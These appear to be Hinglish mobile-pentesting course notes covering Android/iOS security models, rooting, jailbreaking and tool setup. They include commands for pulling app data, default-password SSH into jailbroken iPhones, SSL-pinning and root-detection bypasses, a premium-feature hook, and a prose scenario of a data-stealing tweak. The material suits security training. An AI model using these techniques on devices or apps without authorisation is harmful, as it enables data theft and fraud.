## 1.1: Comparison: Android vs. iOS Security Models

1.  **🎯 Title / Short Summary:** Android (Khula maidan) vs. iOS (Qila) 🛡️. Dono phones data ko kaise mehfooz rakhte hain, aur unki security philosophy mein kya fark hai.
2.  **🤔 Kya hai? (What?):** Security model ka matlab hai woh rules aur design jisse ek operating system (OS) apps aur user data ko khatre se bachata hai.
3.  **💡 Kyu important hai? (Why?):** Ek pentester ke liye yeh janna zaroori hai kyunki dono platforms par attack karne ke tareeke bilkul alag hain. Jo Android pe kaam karega, woh iOS pe nahi chalega.
4.  **⏰ Kab/Kahan check karein? (When/Where?):** Yeh aapka **Day 1, Concept 1** hai. Koi bhi app test karne se pehle, aapko pata hona chahiye ki aapka target (Android ya iOS) kaise bana hai. Yeh galti (developers ki) nahi, balki OS ka design hai jise hum (attackers) abuse karte hain.
5.  **❌ Agar check nahi kiya to kya hoga? (If not checked / consequences):** Aap galat tools istemaal karenge, galat jagah vulnerabilities dhoondhenge, aur ghanton tak apna time waste karenge. Jaise, iOS par "Exported Components" dhoondhna utna critical nahi hai jitna Android par, kyunki iOS ka design hi alag hai.

-----

### ⭐ Comparison: Android vs. iOS Security

| Pehlu (Aspect) | 🤖 Android (The Open Ecosystem) | 🍎 iOS (The Walled Garden) |
| :--- | :--- | :--- |
| **2. Kya hai?** | Ek open-source Linux-based OS jise koi bhi manufacturer (Samsung, Google, etc.) modify kar sakta hai. | Ek closed-source, proprietary OS jo sirf Apple ke hardware (iPhones, iPads) par chalta hai. |
| **3. Kyu important?** (Attacker View) | **Aasani se modify ho sakta hai.** Rooting aasan hai, apps kahin se bhi install (sideload) ho sakti hain. Attack surface bada hai. | **Bahut sakht (strict) control hai.** Jailbreaking mushkil hai. Apps sirf App Store se aati hain. Attack surface chhota hai. |
| **4. Kab/Kahan?** (Pentester Focus) | **App Components (Activities, Services)**, **File System (Readable Data)**, **Hardware-level attacks**. | **App Sandbox**, **Keychain (Secure Storage)**, **Network Traffic**, **App Store policies**. |
| **5. Agar nahi samjha?** (Consequences) | Aap Android ke sabse bade attack vector (IPC, exported components) ko miss kar denge. | Aap app ke sandbox se bahar nikalne ya keychain se data churane par focus nahi kar payenge. |
| **8. Common Mistakes** | Yeh sochna ki har Android phone ek jaisa root hota hai. (Manufacturer UI/security alag hoti hai). | Yeh sochna ki "Jailbreak" karna "Root" karne jaisa hi hai. (iOS jailbreak bahut limited access deta hai). |
| **9. Real-World Scenario** | **Pentester:** `adb` se connect karke app ka data `/data/data/<package_name>` se seedha pull kar leta hai. | **Pentester:** App ka data pull karne ke liye pehle jailbreak karna padta hai, fir SSH karke device mein ghusna padta hai. |
| **11. Key Questions (FAQs)** | *Q: Kya Android kam secure hai?*<br> A: "Kam secure" nahi, "zyada khula" (open) hai, jisse attack karna aasan ho jaata hai. | *Q: Kya iOS hack nahi ho sakta?*<br> A: Bilkul ho sakta hai. iOS mein bhi bugs hote hain (jaise iMessage exploits), lekin app-level par woh zyada sakht hai. |

-----

6.  **🧑‍🏫 Step-by-step explanation / Concept breakdown:**

      * **App Sandboxing:**
          * **Android:** Har app ko ek unique User ID (UID) milta hai. Woh apni files (aur dusre apps ki *agar* permission ho) access kar sakti hai. Root karne par yeh sandbox toot jaata hai.
          * **iOS:** Har app ek "jail" (sandbox) mein rehti hai. Woh *sirf* apne container ke andar ka data hi dekh sakti hai. Dusre app ka data dekhna **namumkin** hai (bina jailbreak).
      * **Permissions:**
          * **Android:** Install-time (purane) ya Run-time (naye) par user se permission maangta hai (e.g., Contacts, Storage). Agar permission mili, toh app poora contacts database padh sakti hai.
          * **iOS:** Har cheez ke liye permission maangta hai (e.g., "Kya app ko Photos access karne dein?", "Kya app ko Bluetooth use karne dein?"). Access bahut limited hota hai.
      * **Code Execution:**
          * **Android:** Apps ko JIT (Just-in-Time) compilation se run karta hai. Memory mein code ko modify karna (Frida se) aasan hai.
          * **iOS:** Sakht Code Signing लागू karta hai. Sirf Apple-approved code hi run ho sakta hai. Memory mein bhi W^X (Write XOR Execute) protection hoti hai, jisse memory mein naya code inject karna bahut mushkil hai.

7.  **🌍 Real-World Attack Scenario (Emphasis):**

      * **❓ Beginner's Core Question:** "Dono hi phone hain, security mein itna fark kyun?"
      * **🕵️‍♂️ Pentesting Scenario (Android):** Pentester ek app install karta hai. `adb shell` se phone mein ghusta hai, `ls /data/data/com.vulnerable.app/shared_prefs/` karta hai aur user ka password/token ek XML file mein likha mil jaata hai. 5 minute ka kaam.
      * **🕵️‍♂️ Pentesting Scenario (iOS):** Pentester ko pehle 1 ghanta laga kar phone jailbreak karna padta hai. Fir phone mein SSH karke app ka container dhoondhna padta hai (`/var/mobile/Containers/Data/Application/<UUID>`). Fir wahan Plist ya SQLite file ko check karna padta hai. Process lamba hai.
      * **💰 Real Bug Bounty Example:** Android par "Exported Activity" dhoondhna ek valid P3/P4 bug hai, kyunki koi bhi dusra (malicious) app use trigger karke sensitive screen khol sakta hai. iOS par yeh concept (is tarah se) exist hi nahi karta, toh wahan yeh bug report reject ho jaayegi.

8.  **✅ Quick checklist / Mitigation:**

      * **Android:** Maan ke chalo ki phone rooted hai. Data ko server-side rakho.
      * **Android:** Root detection, SSL Pinning zaroori hai.
      * **iOS:** Maan ke chalo ki phone jailbroken hai. Data ko Keychain mein rakho, Plist/UserDefaults mein nahi.
      * **iOS:** Jailbreak detection, SSL Pinning zaroori hai.

9.  **🏋️‍♀️ Practice exercise (Lab):**

      * Apne Android emulator par `adb shell` karke `ls /data/data` run karo aur dekho ki aap sabhi app ke folders dekh sakte ho.
      * (Agar iOS device hai) Filza (ek file manager) install karke dekho ki aap `/var/` se bahar ki root file system ko kitna dekh sakte ho.

10. **📚 Further reading / commands / tools:**

      * **Tools:** `adb`, `iFunBox` (iOS file explorer), `Filza` (iOS).
      * **Concepts:** "App Sandbox", "Code Signing", "W^X (Write XOR Execute)".

-----

## 1.2: Android Lab: Emulators vs. Real Devices

1.  **🎯 Title / Short Summary:** Nakli (Emulator) vs. Asli (Real Device) 📱. Test karne ke liye kya behtar hai?
2.  **🤔 Kya hai? (What?):** Emulator ek software hai jo aapke computer (Windows/Mac/Linux) par Android phone hone ka natak karta hai. Real device aapka asli, physical phone hai.
3.  **💡 Kyu important hai? (Why?):** Pentesting ke dauran, aapko 90% kaam emulator par karna chahiye (kyunki woh fast, disposable, aur root-ready hota hai), lekin 10% kaam asli device par karna zaroori hai (un cheezon ke liye jo emulator par nahi chalti).
4.  **⏰ Kab/Kahan check karein? (When/Where?):** Yeh aapka pehla practical decision hai. Test shuru karne se pehle, aapko decide karna hai ki app ko kahan install karein.
5.  **❌ Agar check nahi kiya to kya hoga? (If not checked / consequences):** Aap ek aisi app par time waste kar sakte hain jo emulator par chalti hi nahi (jaise bank apps jo emulator detect karti hain). Ya, aap ek asli phone ko root karne ke chakkar mein use "brick" (kharab) kar sakte hain.

-----

### ⭐ Comparison: Emulator vs. Real Device

| Pehlu (Aspect) | 💻 Emulator (e.g., Genymotion, Android Studio) | 📱 Real Device (e.g., Google Pixel, OnePlus) |
| :--- | :--- | :--- |
| **2. Kya hai?** | PC par chalne wala virtual Android phone. | Aapke haath mein physical Android phone. |
| **3. Kyu important?** (Attacker View) | **Test karne ke liye best.** Aasani se root mil jaata hai (ya pehle se hota hai). Snapshots le sakte hain (galti hui toh revert). Burp certificate install karna 1 minute ka kaam hai. | **Asliyat (Reality) check.** Kuch apps (banking, gaming) emulator detect karke band ho jaati hain. Biometrics, Push Notifications, SIM-based features yahan hi test hote hain. |
| **4. Kab/Kahan?** (Pentester Focus) | **Static/Dynamic analysis, Reversing, Traffic interception, API hacking.** (90% kaam). | **Root detection bypass, Emulator detection bypass, Biometric bypass, SMS/OTP logic.** (10% kaam). |
| **5. Agar nahi samjha?** (Consequences) | Aap "Emulator Detection" bypass jaise bug miss kar denge. | Aap phone ko root karne mein time waste karenge, jabki emulator 5 min mein ready ho jaata hai. Phone 'brick' hone ka risk. |
| **8. Common Mistakes** | Free, slow Android Studio emulator use karna. (Genymotion zyada fast hai). | Naya, mehenga phone test ke liye lena. (Aapko purana, aasani se root hone wala phone chahiye, jaise Google Pixel 2/3). |
| **9. Real-World Scenario** | **Pentester:** App mein SSL Pinning hai. Woh emulator par `Frida` script run karke 2 minute mein bypass kar deta hai. | **Pentester:** App kholte hi "Emulator detected" bol kar band ho jaati hai. Pentester ko app ko real device par daal kar, root karke, fir "Root detection" bypass karna padta hai. |
| **11. Key Questions (FAQs)** | *Q: Kaun sa emulator best hai?*<br> A: Shuruaat ke liye Android Studio (AVD) theek hai. Professional kaam ke liye Genymotion. | *Q: Test ke liye best phone kaun sa hai?*<br> A: Google Pixel (2, 3, 4) ya OnePlus (6, 7). Inhe root karna aasan hai aur community support achha hai. |

-----

6.  **🧑‍🏫 Step-by-step explanation / Concept breakdown:**

      * **Emulator (AVD - Android Virtual Device):**
          * Yeh Android Studio (Google ka official IDE) ke saath free aata hai.
          * Aap "Google APIs" wala image chunte hain, jismein `adb root` by default chalta hai.
          * **Fayda:** Free, Google-supported, setup aasan.
          * **Nuksaan:** Thoda slow ho sakta hai.
      * **Emulator (Genymotion):**
          * Yeh ek third-party emulator hai, speed ke liye jaana jaata hai.
          * **Fayda:** Bahut fast, pentesting ke liye achha hai, GPS, battery simulate kar sakta hai.
          * **Nuksaan:** Free version limited hai, full features ke liye paise lagte hain.
      * **Real Device (Rooted):**
          * Aap ek physical phone lete hain (jaise Google Pixel) aur use root karte hain (Next topic dekho).
          * **Fayda:** 100% real environment. Koi app "emulator" detect nahi kar sakti (lekin "root" detect kar sakti hai).
          * **Nuksaan:** Risk hai (phone kharab ho sakta hai), setup lamba hai, har phone ka tareeka alag hai.

7.  **✅ Quick checklist / Mitigation:**

      * Hamesha **Android Studio (AVD) x86\_64 Google APIs** image se shuru karein (jismein Play Store *nahi* hota).
      * Test ke liye ek purana, unlockable bootloader wala **Google Pixel** phone khareedein.
      * App ko pehle emulator par chalao. Agar na chale, tabhi real device par jao.

8.  **🏋️‍♀️ Practice exercise (Lab):**

      * Android Studio install karo aur ek "Pixel 3, API 30, Google APIs (x86\_64)" AVD create karo.
      * Us AVD ko start karo aur `adb devices` se check karo ki woh connected hai ya nahi.

9.  **📚 Further reading / commands / tools:**

      * **Tools:** Android Studio (AVD), Genymotion.
      * **Commands:** `adb devices` (check connection), `adb shell` (enter device).

-----

## 1.3: Android Lab: Rooting & Privilege Escalation

1.  **🎯 Title / Short Summary:** Phone ka Taala Todna (Rooting) 🔓. Android par "God Mode" (superuser/admin access) kaise haasil karein.

2.  **🤔 Kya hai? (What?):** Rooting woh process hai jisse aap Android OS ke 'root' user (sabse powerful user) ka access paa lete hain. Yeh Windows par "Administrator" ya Linux par "sudo" jaisa hai.

3.  **💡 Kyu important hai? (Why?):** Bina root access, aap ek normal user ki tarah bandhe hue hain. Aap dusre apps ka data (jo `/data/data/` mein hota hai) nahi dekh sakte. Pentesting ke 70% tools (jaise Frida, Drozer) ko root access chahiye hota hai.

4.  **⏰ Kab/Kahan check karein? (When/Where?):** Yeh aapko **real device** par karna padta hai, test shuru karne se pehle. Emulators (jaise AVD) par yeh feature pehle se hota hai (`adb root` command se). Yeh "galti" nahi, yeh ek "feature" hai jise hum pentesting ke liye istemaal karte hain.

5.  **❌ Agar check nahi kiya to kya hoga? (If not checked / consequences):** Aap app ka internal data nahi nikaal payenge, aap runtime par Frida se app ko hook nahi kar payenge, aur aap root detection bypass jaisi cheezein test nahi kar payenge. Aapki pentesting adhoori reh jaayegi.

6.  **🧑‍🏫 Step-by-step explanation / Concept breakdown (General Process):**

      * **Step 1: Unlock Bootloader:** Yeh pehla security gate hai. Har manufacturer (Google, OnePlus) ka alag tareeka hota hai. Isse phone ki warranty *khatm* ho jaati hai aur **poora data delete** ho jaata hai.
      * **Step 2: Flash Custom Recovery (like TWRP):** Aap phone ki original recovery (jo updates install karti hai) ko ek custom, powerful recovery (jaise TWRP) se badal dete hain.
      * **Step 3: Flash Magisk (The Root Manager):** Aap TWRP se `Magisk.zip` file ko "flash" (install) karte hain. Magisk aapko root access deta hai aur use manage karne ke liye `Magisk Manager` app install karta hai.
      * **Step 4: Verify Root:** Aap `Magisk Manager` app khol kar ya `adb shell` mein `su` command chala kar check karte hain. Agar `$` prompt `#` mein badal jaaye, toh badhaai ho, aap root ban gaye\!

7.  **💻 Code example / Command Example (Emulator par Root paana):**

      * **Note:** Yeh AVD (Google APIs image) par hai. Real device ka process bahut lamba hota hai.

    <!-- end list -->

    ```bash
    # 1. Pehle dekho device connected hai ya nahi
    adb devices

    # 2. 'root' access ke liye request karo
    adb root

    # 3. Dobara shell mein enter karo
    adb shell
    ```

      * **✍️ Line-by-line explanation:**
          * `adb devices`: List karta hai ki kaun se devices/emulators aapke PC se jude hain.
          * `adb root`: ADB daemon ko root privileges ke saath restart karne ko bolta hai. Yeh *sirf* "debuggable" ya "engineering" builds (jaise AVD) par chalta hai. Real (production) phone par yeh fail ho jaayega.
          * `adb shell`: Aapko phone ke command prompt (shell) mein login karata hai.
      * **🚀 Quick run expected output:**
          * `adb root` chalane par `restarting adbd as root` dikhega.
          * `adb shell` chalane ke baad, aapka prompt `generic_x86:/ $` ke bajaye `generic_x86:/ #` dikhega. Yeh `#` (hash) nishani hai ki aap root hain.

8.  **🐞 Common beginner mistakes (Emphasis):**

      * **Galat file flash karna:** Apne phone model (e.g., "Pixel 3a") ke liye bani file ki jagah "Pixel 3" ki file flash kar dena. Isse phone **brick (dead)** ho jaata hai.
      * **Bootloader unlock na karna:** Bina bootloader unlock kiye recovery flash karne ki koshish karna (yeh fail ho jaayega).
      * **Data backup na lena:** Bootloader unlock karne se pehle data backup na lena (poora data delete ho jaata hai).
      * **SuperSU use karna:** Magisk ke bajaye purana "SuperSU" use karna. Magisk naya standard hai kyunki yeh "systemless" hai (OS ki files ko badalta nahi) aur root ko chhipa (Magisk Hide) sakta hai.

9.  **🌍 Real-World Attack Scenario (Emphasis):**

      * **❓ Beginner's Core Question:** "Agar main app test kar raha hoon, toh main apne phone ko kyun root karoon?"
      * **🕵️‍♂️ Pentesting Scenario (Ethical Hacker):** Pentester ko ek banking app test karni hai. Woh app mein account banata hai, 4-digit PIN set karta hai. Fir woh rooted phone par `adb shell` se `/data/data/com.banking.app/shared_prefs/` mein jaata hai aur `user_pin.xml` file ko `cat` karta hai. Usse XML mein `<string name="pin">1234</string>` likha mil jaata hai. Yeh ek critical "Insecure Data Storage" vulnerability hai, jo bina root access ke nahi milti.
      * **😈 Real Attack Scenario (Criminal Perspective):** Ek attacker (thief) aapka phone churata hai. Agar phone rooted hai (ya woh use root kar sakta hai), toh woh aapke screen lock ko bypass karke, seedha `/data/data/` se aapke saved passwords, chat history, aur bank app data nikaal sakta hai.
      * **💰 Real Bug Bounty Example:** Aapko bug mila ki "App root detection bypass kar sakti hai." Yeh akele bug nahi hai. Asli bug woh hai jo aapne root karke dhoondha (jaise data chori karna). Rooting sirf ek *tareeka* hai, *vulnerability* nahi.

10. **✅ Quick checklist / Mitigation:**

      * Pentesting ke liye, **Magisk** hi use karein.
      * Hamesha **XDA-Developers** forum se apne exact phone model ke liye guides follow karein.
      * Rooting ke baad, **Frida** aur **Magisk Manager** install karein.

11. **🏋️‍♀️ Practice exercise (Lab):**

      * Apne AVD (Android Studio Emulator) par `adb root` aur `adb shell` run karke `#` prompt haasil karein.
      * Shell ke andar, `ls /data/data` run karke dekhein (jo aap bina root ke `ls /data` par nahi kar paate).

12. **📚 Further reading / commands / tools:**

      * **Tools:** **Magisk** (The best root tool), **TWRP** (Custom Recovery).
      * **Website:** `xda-developers.com` (Rooting ki 'Bible').
      * **Commands:** `adb root`, `adb shell`, `su` (switch user to root).

-----

## 1.4: iOS Lab: Jailbreaking, Cydia, Sideloading

1.  **🎯 Title / Short Summary:** Apple ki Jail Todna (Jailbreaking) 🍎. iOS par root-jaisa access paana, Cydia install karna, aur bina App Store ke apps daalna (Sideloading).

2.  **🤔 Kya hai? (What?):** Jailbreaking woh process hai jisse aap Apple ke "walled garden" (closed ecosystem) ko todte hain aur iOS par full file system access (root access) paate hain.

3.  **💡 Kyu important hai? (Why?):** Jaise Android par 'root' zaroori hai, waise hi iOS pentesting ke liye 'jailbreak' zaroori hai. Bina iske, aap app ke sandbox (jail) mein qaid rehte hain. Jailbreak karke hi aap `Frida`, `Cycript`, `dumpdecrypted` jaise zaroori tools chala sakte hain.

4.  **⏰ Kab/Kahan check karein? (When/Where?):** Yeh aapko **real iOS device** (iPhone/iPad) par karna padta hai. **iOS ka koi stable emulator nahi hota jispar aap app test kar sakein.** Yeh aapka pehla aur sabse mushkil setup step hai. Yeh Apple ki "galti" nahi, unki security feature hai, jise hum (hackers) ek vulnerability (exploit) ka istemaal karke todte hain.

5.  **❌ Agar check nahi kiya to kya hoga? (If not checked / consequences):** Aap iOS app pentesting **kar hi nahi sakte**. Aap app ka data nahi dekh payenge, runtime par kuch check nahi kar payenge, aur SSL pinning bypass nahi kar payenge. Aap sirf traffic (Burp) dekh payenge, agar pinning na hui toh.

6.  **🧑‍🏫 Step-by-step explanation / Concept breakdown:**

      * **Jailbreaking:**
          * Yeh phone mein ek vulnerability (exploit) run karke Apple ki security (code signing, sandbox) ko disable kar deta hai.
          * **Checkra1n / Palera1n:** Yeh "hardware" based jailbreaks hain (bootrom exploit). Yeh iPhone X *tak* ke devices (A11 chip) par kaam karte hain. Inhe roka nahi jaa sakta (unpatchable). Lekin yeh 'tethered' hote hain (phone restart hua toh dobara PC se jailbreak karna padta hai).
          * **Unc0ver / Taurine:** Yeh "software" based jailbreaks hain. Yeh specific iOS versions (jaise iOS 14.3) par hi kaam karte hain. Apple naye update mein inka exploit patch kar deta hai.
      * **Cydia / Sileo:**
          * Jailbreak karne ke baad, yeh "App Stores" install ho jaate hain.
          * Yeh hackers/developers ke liye App Store hai. Yahan se aap `Frida`, `Filza` (File Manager), `NewTerm` (Terminal) jaise "tweaks" (hacks) install karte hain.
      * **Sideloading:**
          * Yeh jailbreaking *nahi* hai.
          * Iska matlab hai PC se ek `.ipa` file (iOS app) ko phone par install karna, bina App Store ke.
          * **AltStore / Sideloadly:** Yeh tools aapke free Apple ID se app ko 7 din ke liye "sign" karke install kar dete hain. Pentesting ke liye (jaise modified app daalni ho) yeh bahut zaroori hai.

7.  **💻 Code example / Command Example (Jailbreak ke baad PC se connect karna):**

      * Jailbreak process khud ek GUI tool (jaise Palera1n) se hota hai, uska code nahi hota. Lekin jailbreak ke baad, aap phone mein SSH kar sakte hain.

    <!-- end list -->

    ```bash
    # 1. PC par, phone se USB par SSH tunnel banayein
    # (Install 'libimobiledevice' on your Mac/Linux)
    iproxy 2222 22

    # 2. Ek naya terminal kholein aur SSH karein
    # Default password 'alpine' hota hai
    ssh root@localhost -p 2222
    ```

      * **✍️ Line-by-line explanation:**
          * `iproxy 2222 22`: Yeh command aapke PC ke port `2222` ko phone ke port `22` (SSH port) se USB cable ke zariye jod deta hai.
          * `ssh root@localhost -p 2222`: Aap apne hi PC (`localhost`) par port `2222` se connect kar rahe hain, jo `iproxy` ne phone ke root user tak forward kar diya hai.
      * **🚀 Quick run expected output:**
          * Aapko password poochega. Aap `alpine` daalenge (jo har jailbroken phone ka default root password hota hai).
          * Aapka prompt `iPhone:~ root#` jaisa dikhega. Badhaai ho, aap iOS device ke andar root bankar baith gaye hain\!

8.  **🐞 Common beginner mistakes (Emphasis):**

      * **Naya iPhone khareed lena:** Pentesting ke liye naya iPhone (13, 14, 15) bekaar hai. Woh jailbreak *nahi* ho sakte. Aapko purana **iPhone 6s, 7, 8, ya X** khareedna chahiye (jo Checkra1n/Palera1n se hamesha jailbreak ho jaayega).
      * **iOS update kar dena:** Jailbreak milte hi "Software Update" off na karna. Naya update aapka jailbreak khatm kar dega.
      * **Default password na badalna:** Jailbreak ke baad `alpine` password na badalna. Koi bhi aapke network par aapka phone hack kar sakta hai. (Login karke `passwd` command chalao).
      * **Sideloading aur Jailbreaking ko ek samajhna:** Dono alag cheezein hain. Sideloading koi bhi kar sakta hai, jailbreaking ke liye exploit chahiye.

9.  **🌍 Real-World Attack Scenario (Emphasis):**

      * **❓ Beginner's Core Question:** "Main app ko App Store se download karunga, toh jailbreak kyun?"
      * **🕵️‍♂️ Pentesting Scenario (Ethical Hacker):** Pentester ko ek social media app test karni hai. Woh app ko App Store se install karta hai. Fir jailbroken phone par `Frida` chala kar app ke runtime mein ghusta hai. Woh 'Premium Feature' check karne wale function (jaise `isPremiumUser`) ko hook karke hamesha `true` return karwa deta hai. Isse woh saare premium features free mein use kar paata hai. Yeh "Broken Access Control" bug hai jo bina jailbreak ke dhoondhna namumkin tha.
      * **😈 Real Attack Scenario (Criminal Perspective):** Attacker ek jailbreak "tweak" banata hai (jo Cydia par free milta hai, jaise "Free Game Coins"). Jab user use install karta hai, woh tweak background mein `ssh root@localhost` karke 'alpine' password try karta hai. Agar user ne password nahi badla, toh tweak phone ke root access paa leta hai aur user ke banking app ka data/keychain data chura kar attacker ke server par bhej deta hai.
      * **💰 Real Bug Bounty Example:** "Jailbreak Detection Bypass." Agar koi app kehti hai "Main jailbroken phone par nahi chalungi" aur aap (pentester) Frida ya 'Shadow' tweak se us detection ko bypass kar dete hain, toh yeh ek valid bug (P3/P4) maana jaata hai.

10. **✅ Quick checklist / Mitigation:**

      * Test ke liye, **iPhone 8 ya X** (iOS 14-15) best hai.
      * Jailbreak ke liye **Palera1n** (Mac/Linux) use karein.
      * Jailbreak ke baad, Cydia/Sileo se **OpenSSH**, **Filza**, aur **Frida** zaroor install karein.
      * Login karke `passwd` command se root password (alpine) zaroor badlein.

11. **🏋️‍♀️ Practice exercise (Lab):**

      * (Agar device hai) Apne iPhone ko Palera1n se jailbreak karne ki koshish karein.
      * Cydia se 'Filza File Manager' install karein aur root directory (`/`) ko browse karein. Dekhein ki aap `/var/mobile/` se bahar jaa sakte hain ya nahi.

12. **📚 Further reading / commands / tools:**

      * **Tools:** **Palera1n** / **Checkra1n** (Jailbreak), **Cydia** / **Sileo** (Package Manager), **AltStore** / **Sideloadly** (Sideloading).
      * **Commands (iOS par):** `passwd` (change password), `dpkg -l` (list installed tweaks).

-----

## 1.5: Tool Setup: ADB, Frida, Objection, Burp Suite

1.  **🎯 Title / Short Summary:** Hamare Hathiyaar (Tools) 🛠️. Pentesting ke liye zaroori 4 tools ko install aur setup karna.

2.  **🤔 Kya hai? (What?):** Yeh woh core tools hain jinke bina mobile pentesting adhoori hai:

      * **ADB (Android Debug Bridge):** Android phone se baat karne ka command-line tool.
      * **Frida:** Ek runtime manipulation toolkit. Chalti hui app ke code ko badalne ke liye (jaise jaadoo 🪄).
      * **Objection:** Frida ko aasan banane wala tool. Bina script likhe basic bypasses karne ke liye.
      * **Burp Suite:** Network traffic dekhne aur badalne wala proxy tool. (Man-in-the-Middle)

3.  **💡 Kyu important hai? (Why?):**

      * `ADB` aapka phone se connection hai.
      * `Burp` aapka app aur server ke beech ka connection hai.
      * `Frida/Objection` aapka app ke dimaag (memory) ka connection hai.
        Inke bina, aap sirf app ko chala kar dekh sakte hain, "hack" nahi kar sakte.

4.  **⏰ Kab/Kahan check karein? (When/Where?):** Lab setup (Module 1) ka yeh aakhri step hai. Phone root/jailbreak karne ke *baad* aur app test karne se *pehle*.

5.  **❌ Agar check nahi kiya to kya hoga? (If not checked / consequences):** Aapka phone PC se connect nahi hoga, aap app ka traffic nahi dekh payenge, aur aap SSL pinning ya root detection bypass nahi kar payenge. Aap basically test shuru hi nahi kar sakte.

6.  **🧑‍🏫 Step-by-step explanation / Concept breakdown:**

      * **Burp Suite Setup:**
        1.  **PC:** Burp Suite Community Edition download aur install karein.
        2.  **PC:** Burp mein, `Proxy > Options` mein jaayein. Ek proxy listener add karein `All Interfaces` par, port `8080` (ya koi aur).
        3.  **Phone:** Phone ke Wi-Fi settings mein jaayein. Manual Proxy set karein. Server IP mein apne PC ka IP (e.g., `192.168.1.5`) aur Port mein `8080` daalein.
        4.  **Phone:** Phone ke browser mein `http://burp` (ya `http://<PC_IP>:8080`) kholein aur "CA Certificate" download karein.
        5.  **Phone:** Android par, certificate ko `cacert.der` se `cacert.pem` rename karein aur "Install a certificate" se install karein. (Android 11+ par root karke system store mein daalna padta hai). iOS par, profile download karke `Settings > General > Profile` se install karein aur `About > Certificate Trust Settings` se "full trust" dein.
      * **ADB Setup:**
        1.  Google se "Android SDK Platform-Tools" download karein (zip file).
        2.  Use extract karein (e.g., `C:\platform-tools`).
        3.  Apne PC ke "Environment Variables" mein us folder (`C:\platform-tools`) ka path add kar dein.
        4.  Command prompt khol kar `adb --version` likhein. Agar version dikhe, toh install ho gaya.
      * **Frida & Objection Setup:**
        1.  PC par Python install hona zaroori hai.
        2.  **PC:** Command prompt mein `pip install frida-tools` aur `pip install objection` chalaayein.
        3.  **Phone (Android):** `frida-server` download karein (aapke phone ke architecture [ARM64] ke hisaab se) Frida ke GitHub releases se. Use `adb push` se phone ke `/data/local/tmp/` mein bhejein. Fir `adb shell`, `su`, `chmod 755 /data/local/tmp/frida-server`, aur `./data/local/tmp/frida-server` se run karein.
        4.  **Phone (iOS):** Jailbreak ke baad, Cydia/Sileo kholein, "Sources" add karein: `https://build.frida.re` aur wahan se "Frida" install kar lein. Woh automatically background mein run hota hai.

7.  **💻 Code example / Command Example (Frida Connection Check):**

      * (Maan rahe hain ki Android par frida-server chal raha hai, ya iOS par Frida install hai)

    <!-- end list -->

    ```bash
    # 1. Apne PC ke terminal par, connected phone/emulator se process list dekhein
    frida-ps -U

    # 2. Objection se ek app ko hook karein (e.g., DIVA app)
    objection -g com.isi.diva explore
    ```

      * **✍️ Line-by-line explanation:**
          * `frida-ps -U`: Frida se kehta hai ki USB (`-U`) se jude device par chal rahe saare processes (apps) (`ps`) ki list de. Yeh check karta hai ki PC aur phone ka Frida connection aapas mein baat kar raha hai ya nahi.
          * `objection -g com.isi.diva explore`: Objection ko bolta hai ki `com.isi.diva` package (`-g` ya `--gadget`) ko hook kare aur uska interactive REPL (`explore`) shuru kar de.
      * **🚀 Quick run expected output:**
          * `frida-ps -U` chalane par apps ki list (PID aur Naam) dikhegi.
          * `objection...` chalane par Objection ka logo banega aur `com.isi.diva #` jaisa prompt aayega, jahan aap `env` (file paths dekhne ke liye) ya `android sslpinning disable` jaise commands chala sakte hain.

8.  **🐞 Common beginner mistakes:**

      * **Burp Certificate:** Sirf certificate install kar dena. iOS par "Full Trust" dena bhool jaana. Android 11+ par root privilege ke saath certificate ko system store mein move na karna (user store mein daalne se apps kaam nahi karti).
      * **ADB Path:** `platform-tools` ko Environment Variables (PATH) mein add na karna. Fir `adb` command chalta nahi hai.
      * **Frida Version:** PC par `frida-tools` (e.g., v16.1.0) aur phone par `frida-server` (e.g., v15.0.0) ka version mismatch hona. Dono **exact same version** ke hone chahiye.
      * **Frida (Android):** `frida-server` ko root (`su`) bankar run na karna. Bina root, woh dusre apps ko hook nahi kar sakta.

9.  **🌍 Real-World Attack Scenario (The "How-To-Hack"):**

      * **❓ Beginner's Core Question:** "Itne saare tools ek saath kaise kaam karte hain?"
      * **🕵️‍♂️ Pentesting Scenario (Ethical Hacker):**
        1.  Pentester app kholta hai. App kehti hai "Please update" aur band ho jaati hai (Force Update).
        2.  Woh **Burp Suite** (Tool 1) se traffic dekhta hai. App, `/api/v2/checkUpdate` call kar rahi hai.
        3.  Woh **ADB** (Tool 2) se app ka package name (`adb shell pm list packages | grep "appname"`) nikaalta hai.
        4.  Woh **Objection** (Tool 3) se app ko hook karta hai (`objection -g <package> explore`).
        5.  App restart karta hai. Jab woh update check call karti hai, Objection ka prompt use bypass karne ka command deta hai (e.g., `android root disable`, `android sslpinning disable` agar zaroori ho).
        6.  Agar Objection se bypass na ho, toh woh **Frida** (Tool 4) ki custom script likhta hai jo `checkUpdate` function ko hook karke hamesha `false` return karwa deti hai.
        7.  App khul jaati hai aur pentester aage test kar paata hai.
      * **💰 Real Bug Bounty Example:** Yeh poora setup hi aapko bug bounty dilaata hai. Sirf `frida-ps -U` chalana bug nahi hai, lekin is setup ka istemaal karke SSL Pinning (Module 2) ya Biometric Bypass (Module 4) dhoondhna ek valid bug hai.

10. **✅ Quick checklist / Mitigation:**

      * `Burp`: PC IP aur Phone Proxy settings check karo. Certificate ko "Trust" zaroor karo.
      * `ADB`: `adb devices` se hamesha check karo ki device 'authorized' hai.
      * `Frida`: `frida-ps -U` se hamesha connection check karo. PC aur Phone par version same rakho.
      * `Objection`: Hamesha `objection -g <package> explore` se hi app start karo.

11. **🏋️‍♀️ Practice exercise (Lab):**

      * Apne PC aur emulator/phone par Burp Suite ka certificate install karo aur `google.com` ka HTTPS traffic dekho.
      * Apne rooted AVD par `frida-server` run karo aur PC se `frida-ps -U` chala kar process list dekho.

12. **📚 Further reading / commands / tools:**

      * **Commands (ADB):** `adb devices`, `adb shell`, `adb push <local_file> <remote_path>`, `adb pull <remote_file>`, `adb logcat` (logs dekhne ke liye).
      * **Commands (Frida):** `frida-ps -U` (list processes), `frida-trace -U -i "openURL" <package>` (function ko trace karna).
      * **Commands (Objection):** `objection explore`, `android sslpinning disable`, `android root disable`, `ios jailbreak disable`.

-----

Module 1 complete\! 🏁 Humne apni lab setup kar li hai, Android/iOS ka fark samajh liya hai, aur apne saare hathiyaar taiyaar kar liye hain.

Jab aap ready hon, toh batana. Hum **Module 2: App Anatomy & Traffic Hacking** shuru karenge, jahan hum app ko khol kar (APK/IPA) dekhenge aur uska network traffic (Burp) check karna shuru karenge\! 📱➡️💻

=============================================================

Chalo bhai, shuru karte hain aapke Complete Mobile Pentester notes ka Module 2\! 🚀

